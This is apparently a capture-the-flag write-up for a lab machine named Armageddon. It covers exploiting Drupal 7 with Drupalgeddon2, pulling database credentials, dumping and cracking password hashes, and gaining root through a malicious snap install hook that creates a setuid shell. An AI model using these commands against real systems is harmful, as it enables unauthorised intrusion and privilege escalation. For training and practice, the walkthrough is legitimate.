# Armaggedon

export IP=10.10.10.233

# Solution

Starting with an nmap scan

```bash
cmd: sudo nmap -sC -sV -oN nmap/initial $IP

22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```

Lets check all the information that the nmap gave on the webserver running on port 80 <br>

**Note:** i'll also leave an all port scan in the background <br>

Checking the functionality, we can do basically anything besides login <br>

The **Create new account** dont work completely (because we cant login) but it seems that the information is actually stored (refers that needs approval) <br> 

Robots.txt
``` 
---snip---
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
``` 

In the **/CHANGELOG.txt** we can see the drupal version
```
Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.
```

Well, it's a pretty old version and ofcourse there is a metasploit payload for it with a name that seems to correlate with the machine... well this escalated quickly
```
1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
```

Using the exploit
```
cmd: whoami && id
apache
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

One thing that i checked, that i usually dont do was checking the kernel version
``` 
cmd: uname -a

Linux armageddon.htb 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

We can see the **armageddon.htb** which may be needed further down the road. <br>

Searching the drupal configs found the DB credentials at **../sites/default/settings.php**
```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

So i tried to use mysql interactively but it was just freezing, so i went ahead and searched for non-interactive queries execution [here](https://electrictoolbox.com/run-single-mysql-query-command-line/)
```bash
So to run a single MySQL query from your regular shell instead of from MySQL’s interactive command line you would do this:
mysql -u [username] -p [dbname] -e [query]
``` 

So i build some commands to extract passwords
```bash
cmd: mysql -u "drupaluser" -h "localhost" "-pCQHEy@9M*m23gBVj" "drupal" -e "show tables;"
# ----snip---
users
users_roles
# ----snip---

cmd: mysql -u "drupaluser" -h "localhost" "-pCQHEy@9M*m23gBVj" "drupal" -e "describe users;"
uid     int(10) unsigned        NO      PRI     0
name    varchar(60)             NO      UNI
pass    varchar(128)            NO
# ---snip---

cmd: mysql -u "drupaluser" -h "localhost" "-pCQHEy@9M*m23gBVj" "drupal" -e "select uid, name, pass from users;"
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
3       test                    $S$Dhd1BggGXot5EmAOTfHCpYcxufquc3rWA66md.Bu4rYRbIwbx.h8
4       test123                 $S$DWYn3n/vHyQpUnFMkLXc0zxMnKCDHj/IH/57QsuuZS9SNGHhvfaS
```

My initial idea was to generate a hash and change the **brucetherealadmin** but the **apache** user is not able to run php and thus not run the **/scripts/password-hash.sh** script (which generates a hash for a given password) <br>

So i tried to crack the hash (with john), and it cracked
```bash
brucetherealadmin:booboo
```

Trying it for the ssh service, worked
```bash
cmd: whomai && id

brucetherealadmin
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

cmd: cat ~/user.txt
# FLAG: f3a13dc50f1c88e54f257fbb13403cbb
```

Into root baby! Checking what the user can do as sudo
```bash
cmd: sudo -l

---snip---
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

In gtfobins we have an entry for snap in order to install a malicious package <br>

We need to build it locally with
```bash
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\ncp /bin/bash /home/brucetherealadmin/.w/rootbash && chmod +s /home/brucetherealadmin/.w/rootbash' > meta/hooks/install
chmod +x meta/hooks/install
fpm -n waza -s dir -t snap -a all meta
```

and voila, we are root
```bash
cmd: whoami && d

root
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) euid=0(root) egid=0(root) groups=0(root),1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

cmd: cat /root/root.txt
# FLAG: ed16db86a1a5df415b4d3ebdefab4e42
```